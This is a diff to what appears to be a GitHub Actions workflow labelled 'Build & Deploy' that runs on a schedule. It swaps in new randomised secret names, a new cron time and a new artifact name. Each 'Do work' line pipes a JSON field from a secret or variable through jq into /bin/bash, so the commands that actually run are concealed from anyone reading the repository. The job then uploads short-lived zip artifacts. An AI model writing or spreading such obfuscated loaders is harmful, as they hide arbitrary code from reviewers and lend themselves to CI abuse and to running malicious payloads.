@@ -1,9 +1,9 @@
-name: Build {{WORKFLOW_DISPLAY_NAME}} Deploy
+name: Build & Deploy
 on:
   workflow_dispatch:
 
   schedule:
-    - cron: '46 0,6,12,18 * * *'
+    - cron: '18 1,7,13,19 * * *'
 jobs:
   launch:
     runs-on: ubuntu-latest
@@ -15,19 +15,17 @@ jobs:
           fetch-depth: 1
       - name: Do work
         env:
-          nztg3: ${{ secrets.nztg3 }}
+          hx9491: ${{ secrets.hx9491 }}
         run: |
-          printf '%s' "$nztg3" | jq -r .ly90990 | /bin/bash
-          echo $x4001 | jq -r .kandm91090 | /bin/bash
-          printf '%s' "$imkrr9" | jq -r .fb5803 | /bin/bash
-          printf '%s' "$c65170" | jq -r .zi38 | /bin/bash
-          printf '%s' "$ic1" | jq -r .o870 | /bin/bash
-          echo $ioh9583 | jq -r .gmn156 | /bin/bash
-          echo $ogn26400 | jq -r .bsot141 | /bin/bash
+          printf '%s' "$hx9491" | jq -r .ou9 | /bin/bash
+          echo $npwl97133 | jq -r .uvtp388 | /bin/bash
+          echo $fbuu5 | jq -r .qx8523 | /bin/bash
+          echo $lydx55134 | jq -r .djckf74185 | /bin/bash
+          printf '%s' "$s34259" | jq -r .hbcl67 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
         with:
-          name: MeqDXUBA
+          name: hBjnYyIq
           path: "*.zip"
           retention-days: 1
